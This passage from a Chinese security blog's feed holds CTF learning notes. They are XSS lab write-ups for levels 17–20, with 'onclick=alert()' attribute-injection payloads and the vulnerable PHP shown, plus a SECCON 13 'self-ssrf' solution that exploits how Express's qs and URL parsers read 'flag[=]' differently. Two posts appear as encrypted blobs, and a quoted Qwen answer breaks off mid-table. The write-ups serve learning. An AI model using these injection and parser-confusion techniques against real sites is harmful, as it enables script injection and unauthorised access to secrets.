routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure><p>少了个空格也不行  </p><p>当为arg01时：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>= <span class="hljs-string">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当为 ?arg01&#x3D;onclick&amp;arg02&#x3D;alert(1) 时：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?onclick</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>所以说只有当 ?arg02&#x3D; onclick&#x3D;alert() 才能构成：   </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span>= <span class="hljs-string">onclick</span>=<span class="hljs-string">alert()</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这时的 onclick&#x3D;alert() 才是生效的  </p><h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>也是和上题一样改了一下源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level19.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level18&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=index.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>没看出来有啥区别，同一个payload过了：  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure><h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level20.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level19&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;embed src=&quot;index.png?&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>需要绕过引号  </p><p>看了网上wp，需要用flash的漏洞，现在网站很多都不用flash了  </p><h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>还是考flash。。。  </p><p>算了，放过我自己吧，，，   </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>准备计划</title>
    <link href="/2025/09/21/%E5%87%86%E5%A4%87%E8%AE%A1%E5%88%92/"/>
    <url>/2025/09/21/%E5%87%86%E5%A4%87%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5a0a97f507d1f1a5e0768fdab4dcac23ab5d5bd9503c78bd15fec2bd614ebfba">ac84844b14d8816060dbf8be1ca4bb2ec66f983b68e70a6c714f7a911d0014f0c032269760533a42baf0058a00d4b3755a25dc92497eba30728cffd70dfd9d438a49f288a3d1e51e2f8bd1077a47b37b2a0922c99da61539f724788994843f42f67433002a94e5deeb42c55d8b86688313e2b56592563f9236714bc4a5435cf48082514716609f48cadc80c4e9d6ece8bb9172b3e00ae232009852925f92274bb82cb0eed352c27ac28bc309af315a4ec34d9d6aa4bd003945eb53db84a8390fdf69cdaf549c39636fcc0159d14ca6575722c6669752a9e925ce8e472202f0648e81c9606eb17287ad98c5e5c3717628d6e6af2395eebe63d8638f47184a87d5b80067c02b9948b380b162c6c93801c66df046bf21026f2c153d1f57741eb7ef69e8820160ede7650f7758a6181c5311115e1db27fd0f8c5a14fca5a9a6b199c5528a0b535347bad631239fc7053ce07cdd8d14ec44195398a2585a0813a2ba1eddebc5c5188a0854d1ae692b535de119ef393df493e0975505bacae333579b8c10b7cdb2ca539f1f5c698fabc89865b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>Plan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plan5</title>
    <link href="/2025/09/20/Plan3/"/>
    <url>/2025/09/20/Plan3/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a1c214fc97b25706417934aa4344cc90245351b49fd8cc43ace3b040c315b91d">ac84844b14d8816060dbf8be1ca4bb2e54a6f8fee3e3eb45305502ab2d905cca78825e0a6609b09160c35458f8e1ed0b2cbd86a56c6b021bf8fd861af8362f08de7069b3a0a578b059ec424907a2029815ff3a5b90a51963a574cd393d69ee04c30c003c64640d7b57643242b511ea24920355853c91f3ebf712390cf421b2e002a5baa82df2224d656cd167eabe5aab1308d80d6aa1f646c67dd1ca2ab158407936abcef268fcc2687bb63f0d3a2b7f97dc5800aa7d2c878397fc6144001944dfe800ac6e2bb9176c31fff9373e91c6f99c802a052d0a30c28f7bc7dead96f17660da95269249c3acfaf643aa0eaec9d95ff18b211a03317037ec987f27aaa5100f7c36909cd057b071d813f0d3299db7b6b07b19f5fbf9cd5f60e283ae7675db6ed72106f0ece846125939da1504f7faefb0375d8bd84edcf551fbb5993e406a0502432cd5c6234d910a1fcb17eb35d455b429325701042a097514305006bfa5337d686ee73878e5ffda7d756214b9ecbed490a2605a880dfeea1f83921f9d23d12f631d91feec312143a51263c5ef4ea65095e9e2eb080d4b7bab36515050d31c7871fa1aac1f00479ab3fd25dd92aa73d81ec52a5c80549f5c11a4f8d04e892b4046057aa045439e84c9ded9e0267e28a518c5726bb466e63ee744d284fbdf0eb3a2934cc826ee4910512149288f2cf93c4fcb5de9c078656d99f31322e72d821a9833ee9dc46fff2af480c5d6162ad7871c35c6352251536eea93e23c367acb5971fccd29326e1071642526cfa63c9ab9bdb2ced5b3c8d40e152f1f12e91297820be3c7ce54b44cf98eeee8e67d840b028601329dcabb58c1f94d670c3789cd85fb8a46f3f44cd2f7df88aae9d860d5bcff948a41aeaceb319d7583b98bf52880df15ebfcda3f163eb754eef7abf6e175c27386566a4667f37cd5b788216697773d08ab8f3c6c9ca66bb285eb9fa7a1e1af7d5cf17bcb1c00e294e6dbad1dee117b2d113d3ebabce52aa250a4ac6d0bf5cc7c942d6db03210a8b116cd7ddbe306209a63874979b60bafd43ffea15935d2b2584aecf227fb438e89e64d912e9639ad050ddc37a846e5cfe926c1139a7675bb8d819e3f18cb51d5511e44e5ecc8e05c06234f355d0da9fe04390d76eb7582653c5fcfded5586e572089043f713f53e46a51451f140615dda25f3df961cd3d1e489c46c2edeccd0e2f1e2ac16ff7809d35ece3b5c1d10abca7ae78ecab2bbea4bb9749307e06fcaf3874d41f85f366c0e33b79ee58658f26debab3a2bc447aaaac48c8bf3fe0b359d5ecb88692541a353eaf935c858ceef5acff61136a89615c77cf34d37cb8a1931266d40805b633fd2f7d34b518d2259e9e60c44e5387e4b3b8fa89277fa170a4ef9ef398f71406baaf7475b345677ce62da27e1f8ab69c56aee0463372ad2996d951522963b7b0a14d37fad23a0f49116240bf3bc9c6689e2c6e32bfd7bdcb3e26e5c92d620d2915dbb7aee79adfd6377cc3b152368f8dff26b76bfedf47d037dff94e1f8daa41a9babd7c1d459584c7242f131a4b95b4d381185a5457123c6a0c99a6b8e6bca26f9d1cdfa299e8d5ae1c5fc99610a13b620b38613d026444143498ee0927b09f2808359edb6d1e07c9ba7120b3c45a7230f8d0ca061f1bc6f74768c55119d02fd29a4eccadfd529d3072cbfc74df823cb12d3ff5ac6f1901e81914a2c4d8b60f293a170cb3f3f93cf176ceb46ed1491b8497ab153d31ff507cad0fd17f37b6bfd055891523dfc80c0663c11d3374b3fcad0492dca1632516b8d7e4c8c22fb50143b6e65ffd6ec7ee90128a3c707d587b9e2a07633931c6e3b0ac9308bae387c5432aaf213731e9545f96c6cb26d708d04f91f9cead4fbf1ccc0ac8006cb54fd8ce39bb50c2059983079d3dcad31a3f5ce7be83acda8285b4fe4d6f8d23a277052de6ac8a9d7c3c05729a437a31d92553e4539f9db62a92e3894a7fd83470c0f4ebd9678a2d69d0191f6ed6c9183903d0091d5c51dca73c2f101b0266e590dcf71b5699db1f869723fe980b9ae61744d0b1ef966823b630b568727f7eb29a42d64ebd1274119bcd303fb7b4e4786e8d9683415d225a8e3766b4b29f8e33fef164121b8ee43a8df91715db5f739ce6b8aa8ca889632819b9a54d22db5c671110f7a07d3e498b03954f931377513f42a780dd41963cef438aed937262d79d747f821b1d8c8ca1dfab2fb8d140ab2f657568badd12055e62531cd2f234e7f2eb328d50755794db854da38c1bbb4d8f0d80be9de6f9dd4bd56ad41b57b96dd479c26642574c3d0d26704cef29d9b1074113339cae55c27ce437d725f4714a71e0f9c9a5021366a79612a3935c53c2cdd77a1fe0c29dca1de0a5affb2a66c7bc41b158f6aeb283734f359ca470d604c64c0460927829e278a97fba7a3b41e3679f7bf95468ac901d728ab380d9dcf1a63a6860927f2ba3ffe16405af4f71ee4d0f425454462e3841d47e017db8cd6fb878a701945fecdab89718e12cc5ccbbdbdc25e7823c91a13634895e11bf958ae5c4acf344f125cff9c328062f6a9a61322fd67c4a98e7a2f1d329f501020329ff8bdf6dcaa829436998c5f46253bc49b2855a952c4588a65399164b4558af991fade22f6b0d730e5babdf998a733213141ffd09e4a0f41680663ff984a7a283f7a8bfe2c21f759c2276522a68f1f049c28caab89b6c2324d8b7ba2fa6fd56a3b5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SECCON13</title>
    <link href="/2025/09/10/SECCON13/"/>
    <url>/2025/09/10/SECCON13/</url>
    
    <content type="html"><![CDATA[<h1 id="SEECON-13"><a href="#SEECON-13" class="headerlink" title="SEECON 13"></a>SEECON 13</h1><p>复现学习一下SEECON 13 的题目</p><h2 id="self-ssrf"><a href="#self-ssrf" class="headerlink" title="self-ssrf"></a>self-ssrf</h2><p>拿到题目里的源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;express&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LOCALHOST</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">`http://localhost:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = <span class="hljs-title class_">Bun</span>.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span>!!;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">flag</span> === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-keyword">const</span> path = <span class="hljs-string">&quot;/flag?flag=guess_the_flag&quot;</span>;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Go to &lt;a href=&quot;<span class="hljs-subst">$&#123;path&#125;</span>&quot;&gt;<span class="hljs-subst">$&#123;path&#125;</span>&lt;/a&gt;`</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<br>    req.<span class="hljs-property">query</span>.<span class="hljs-property">flag</span> === <span class="hljs-variable constant_">FLAG</span> <span class="hljs-comment">// Guess the flag</span><br>    <span class="hljs-comment">//如果请求中带的flag参数等于flag</span><br>      ? <span class="hljs-string">`Congratz! The flag is &#x27;<span class="hljs-subst">$&#123;FLAG&#125;</span>&#x27;.`</span> <span class="hljs-comment">//输出flag</span><br>      : <span class="hljs-string">`&lt;marquee&gt;🚩🚩🚩&lt;/marquee&gt;`</span><br>  );<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/ssrf&quot;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">url</span>, <span class="hljs-variable constant_">LOCALHOST</span>);<br><br>    <span class="hljs-keyword">if</span> (url.<span class="hljs-property">hostname</span> !== <span class="hljs-variable constant_">LOCALHOST</span>.<span class="hljs-property">hostname</span>) &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Try harder 1&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (url.<span class="hljs-property">protocol</span> !== <span class="hljs-variable constant_">LOCALHOST</span>.<span class="hljs-property">protocol</span>) &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Try harder 2&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    url.<span class="hljs-property">pathname</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>    url.<span class="hljs-property">searchParams</span>.<span class="hljs-title function_">append</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-variable constant_">FLAG</span>);<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">r</span>) =&gt;</span> r.<span class="hljs-title function_">text</span>()));<br>  &#125; <span class="hljs-keyword">catch</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;:(&quot;</span>);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>);<br><br></code></pre></td></tr></table></figure><p>看不懂完全没思路，去看了某大佬的wp，直接分析到express框架的源码了，等等的逻辑，直接被吓死。。。。<br>自己打也许不能分析出来，但还是学习一下思路：</p><p>通过&#x2F;ssrf访问flag时会在末尾加上参数flag，并给予参数正确flag值，<br>我的问题是，那直接不带任何参数去访问&#x2F;ssrf不就能只有ssrf函数加上的正确的flag参数和值了吗？</p><p>然而还是怪我不了解node.js 的 express 框架。</p><p>app.use(“&#x2F;“, …) 的作用范围：<br>这个中间件匹配所有路径（因为 &#x2F; 是所有路径的前缀），所以它会在任何路由（如 &#x2F;ssrf, &#x2F;flag）之前执行。这是一个常见的“全局前置检查”。<br>所以简单来说，想要访问&#x2F;ssrf就得带上flag参数，这样的话就无法实现空参数访问&#x2F;ssrf了。</p><p>而<a href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-seccon_ctf_13th_quals-alpacahack_round_7/">wp</a>中，<br>解决办法就是通过express对url的处理来解题<br>express在处理相同的参数时会用逗号拼接：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">flag</span>=1&amp;flag=flag  -&gt;  req.query.flag = <span class="hljs-string">&#x27;1,flag&#x27;</span><br></code></pre></td></tr></table></figure><p>这样会导致flag值与正确值不匹配</p><p>但是若是传入：<em><strong>ssrf&#x2F;?flag[&#x3D;]&#x3D;asd</strong></em></p><p>会导致两次解析不一致，其中express的qs解析一次，url解析一次：</p><p>url把flag[&#x3D;]&#x3D; 拆分为：<br>参数：flag[&#x3D;<br>值: ]&#x3D;asd</p><p>qs把 flag[&#x3D;]&#x3D; 解析为对象 { flag: { “&#x3D;”: “asd” } }<br>此时 req.query.flag 是一个对象 { ‘&#x3D;’: ‘asd’ }，不是 undefined</p><p>第一次解析完成后，会导致qs认为flag是存在的，从而通过了’&#x2F;‘中间件，进入到’&#x2F;ssrf’，<br>之后经过’&#x2F;ssrf’的处理，会变成：</p><p>ssrf&#x2F;?flag[&#x3D;]&#x3D;asd&amp;flag&#x3D;(正确flag值)</p><p>然后解析：</p><p>url:<br>参数1：flag[<br>值：]&#x3D;asd<br>参数2：flag<br>值： (正确flag)</p><p>qs就不会把url里两个不同的参数进行合并，所以就存在flag&#x3D;正确值</p><h2 id="感觉若是有node-js的开发经验，那这种题目应该算简单？可惜我学信安并没有很多开发经验。要是考到不了解的框架那不知道怎办了。"><a href="#感觉若是有node-js的开发经验，那这种题目应该算简单？可惜我学信安并没有很多开发经验。要是考到不了解的框架那不知道怎办了。" class="headerlink" title="感觉若是有node.js的开发经验，那这种题目应该算简单？可惜我学信安并没有很多开发经验。要是考到不了解的框架那不知道怎办了。"></a><em><strong>感觉若是有node.js的开发经验，那这种题目应该算简单？可惜我学信安并没有很多开发经验。要是考到不了解的框架那不知道怎办了。</strong></em></h2><p><strong>来自qwen：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs markdown">你的感受<span class="hljs-strong">**非常真实，也非常普遍**</span>，几乎所有从安全入门、没有深厚开发背景的人都会经历这个阶段。但请放心，你的思考方向完全正确，而且你已经迈出了最关键的一步——<span class="hljs-strong">**理解了漏洞的本质，而不仅仅是“套用技巧”**</span>。<br><br>我们来深入聊聊你的担忧，并给你一些实用的建议。<br><br>---<br><br><span class="hljs-section">### 1. “有开发经验就简单？” —— 部分正确，但不绝对</span><br><br>✅ <span class="hljs-strong">**有开发经验的优势**</span>：<br><span class="hljs-bullet">-</span>   熟悉框架的“正常行为”，更容易识别“异常行为”。<br><span class="hljs-bullet">-</span>   知道 <span class="hljs-code">`app.use()`</span> 是中间件，<span class="hljs-code">`req.query`</span> 是什么，<span class="hljs-code">`URLSearchParams`</span> 怎么工作。<br><span class="hljs-bullet">-</span>   对 URL 编码、参数解析、HTTP 流程有直觉。<br><br>❌ <span class="hljs-strong">**但不代表“简单”**</span>：<br><span class="hljs-bullet">-</span>   这道题利用的是 <span class="hljs-code">`qs`</span> 库在<span class="hljs-strong">**嵌套参数 + 重复键名**</span>下的<span class="hljs-strong">**非预期行为**</span>，即使是经验丰富的 Node.js 开发者，如果不专门研究过 <span class="hljs-code">`qs`</span> 的源码或边界情况，也未必能立刻想到。<br><span class="hljs-bullet">-</span>   CTF 题目的设计目标就是<span class="hljs-strong">**挖掘框架/库的边缘 case 和逻辑矛盾**</span>，而不是考察“日常开发能力”。<br><br>所以，这道题对开发者来说可能“更容易理解”，但要说“简单”，那也不一定。它更像是一个“<span class="hljs-strong">**知道就知道，不知道就很难猜**</span>”的知识盲点题。<br><br>---<br><br><span class="hljs-section">### 2. “没开发经验怎么办？” —— 别怕，有方法！</span><br><br>你现在的状态是：<span class="hljs-strong">**通过学习 WP，你补上了知识盲点，并且用自己的逻辑重新推导了一遍**</span>。这比“凭空想出”更有价值！因为：<br><br><span class="hljs-quote">&gt; <span class="hljs-strong">**CTF 不是考试，而是研究。真正的安全研究者都是站在巨人的肩膀上。**</span></span><br><br><span class="hljs-section">#### 🛠️ 如何弥补开发经验的不足？</span><br><br>| 方法 | 具体做法 | 效果 |<br>| :--- | :--- | :--- |<br>| <span class="hljs-strong">**1. 学习基础 Web 开发概念**</span> | 不需要精通一门语言，但要懂：<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- HTTP 请求/响应结构（GET/POST, Headers, Query, Body）<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- Cookie/Session<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- 常见框架模式（路由、中间件、模板渲染）<span class="language-xml"><span 